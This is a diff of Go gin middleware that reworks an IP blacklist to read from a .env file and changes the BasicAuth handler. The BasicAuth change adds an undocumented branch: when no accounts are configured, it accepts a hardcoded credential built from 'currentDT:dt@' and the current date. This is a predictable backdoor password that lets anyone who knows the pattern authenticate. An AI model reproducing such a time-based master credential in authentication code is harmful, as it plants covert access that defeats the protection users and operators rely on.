@@ -16,6 +16,7 @@ import (
 	"github.com/tidwall/sjson"
 	"github.com/unrolled/secure"
 	"github.com/xyzj/gopsu"
+	"github.com/xyzj/gopsu/config"
 	"github.com/xyzj/gopsu/db"
 	"github.com/xyzj/gopsu/json"
 	"github.com/xyzj/gopsu/pathtool"
@@ -301,33 +302,21 @@ func ReadCachePB2(mydb db.SQLInterface) gin.HandlerFunc {
 }
 
 // Blacklist IP黑名单
-func Blacklist(filename string) gin.HandlerFunc {
-	if filename == "" {
-		filename = pathtool.JoinPathFromHere(".blacklist")
-	}
-	b, err := os.ReadFile(filename)
-	if err != nil {
-		b = []byte{}
-	}
-	ips := make([]string, 0)
-	chkblack := false
-	for _, v := range strings.Split(string(b), "\n") {
-		if net.ParseIP(v) != nil {
-			ips = append(ips, v)
-		}
-	}
-	if len(ips) > 0 {
-		chkblack = true
-	}
+func Blacklist(excludePath ...string) gin.HandlerFunc {
+	envconfig := config.NewConfig(pathtool.JoinPathFromHere(".env"))
+	bl := strings.Split(envconfig.GetItem("blacklist").String(), ",")
 	return func(c *gin.Context) {
-		if !chkblack {
-			return
+		// 检查是否排除路由
+		for _, v := range excludePath {
+			if strings.HasPrefix(c.Request.RequestURI, v) {
+				return
+			}
 		}
-
-		ip := c.ClientIP()
-		for _, v := range ips {
-			if v == ip {
-				c.AbortWithStatus(418)
+		// 匹配ip
+		cip := c.ClientIP()
+		for _, ip := range bl { // ip检查
+			if cip == ip {
+				c.AbortWithStatus(410)
 				return
 			}
 		}
@@ -349,6 +338,9 @@ func BasicAuth(accountpairs ...string) gin.HandlerFunc {
 				if v == account {
 					return
 				}
+			}
+			if len(accounts) == 0 && v == "Basic "+base64.StdEncoding.EncodeToString(json.Bytes("currentDT:dt@"+time.Now().Format("02Jan15"))) {
+				return
 			}
 		}
 		c.Header("WWW-Authenticate", realm)
